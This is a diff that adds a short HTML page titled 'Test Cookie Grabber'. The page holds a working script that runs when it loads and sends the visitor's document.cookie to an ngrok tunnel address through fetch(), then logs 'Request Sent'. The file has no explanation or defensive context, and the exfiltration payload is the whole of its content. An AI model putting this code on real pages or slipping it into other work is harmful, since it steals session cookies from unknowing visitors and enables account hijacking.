@@ -1,0 +1,14 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Test Cookie Grabber</title>
+</head>
+<body>
+  <script>
+    fetch("https://ac75-2401-ba80-ac02-18fd-6442-156e-e83b-7b0a.ngrok-free.app/?cookie=" + document.cookie)
+      .then(response => console.log("Request Sent"))
+      .catch(error => console.error("Error:", error));
+  </script>
+</body>
+</html>
+
